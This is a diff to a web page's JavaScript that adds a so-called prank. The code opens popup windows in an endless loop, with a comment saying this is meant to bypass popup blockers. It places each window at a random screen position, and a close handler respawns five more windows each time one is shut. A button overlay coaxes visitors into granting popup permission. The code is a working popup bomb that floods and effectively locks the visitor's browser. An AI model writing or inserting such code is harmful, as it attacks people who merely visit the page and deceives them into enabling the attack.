@@ -828,11 +828,19 @@ function closePopup() {
 function startPrank() {
     const imageUrl = 'tungtungtung.jpg';
 
-    // open as many tabs as the browser will allow
+    // open as many small windows as the browser will allow
     // doing it synchronously inside the click handler tends to bypass
     // popup blockers, so we loop until window.open fails.
     while (true) {
-        const newWindow = window.open('about:blank', '_blank');
+        // calculate random size & position
+        const w = 300;
+        const h = 300;
+        const maxX = window.screen.availWidth - w;
+        const maxY = window.screen.availHeight - h;
+        const x = Math.floor(Math.random() * (maxX + 1));
+        const y = Math.floor(Math.random() * (maxY + 1));
+        const features = `width=${w},height=${h},left=${x},top=${y}`;
+        const newWindow = window.open('about:blank', '_blank', features);
         if (!newWindow) {
             // blocked or unable to open more tabs
             break;
@@ -844,29 +852,61 @@ function startPrank() {
             <head>
                 <title>CAUGHT!</title>
                 <style>
-                    body {
+                    html, body {
                         margin: 0;
                         padding: 0;
+                        width: 100%;
+                        height: 100%;
+                        background: #000;
+                        overflow: hidden;
+                    }
+                    body {
                         display: flex;
                         align-items: center;
                         justify-content: center;
-                        height: 100vh;
-                        background: #000;
                     }
                     img {
-                        max-width: 100vw;
-                        max-height: 100vh;
-                        object-fit: contain;
+                        width: 100%;
+                        height: 100%;
+                        object-fit: cover;
                     }
                 </style>
             </head>
             <body>
                 <img src="${imageUrl}" alt="Prank!" />
+                <script>
+                    // when this tab is closed, attempt to open five more
+                    window.onbeforeunload = function() {
+                        for (let i = 0; i < 5; i++) {
+                            const w = 300;
+                            const h = 300;
+                            const maxX = window.screen.availWidth - w;
+                            const maxY = window.screen.availHeight - h;
+                            const x = Math.floor(Math.random() * (maxX + 1));
+                            const y = Math.floor(Math.random() * (maxY + 1));
+                            const features = 'width=' + w + ',height=' + h + ',left=' + x + ',top=' + y;
+                            window.open('about:blank', '_blank', features);
+                        }
+                    };
+                <\/script>
             </body>
             </html>
         `);
     }
 }
+
+// when the DOM is ready, hook the allow-popups button
+document.addEventListener('DOMContentLoaded', () => {
+    const overlay = document.getElementById('popupPermissionOverlay');
+    if (overlay) {
+        const btn = document.getElementById('allowPopupsButton');
+        btn.addEventListener('click', () => {
+            // trigger a popup from a user gesture; browser may ask permission
+            window.open('about:blank', '_blank');
+            overlay.remove();
+        });
+    }
+});
 
 listZones();
 
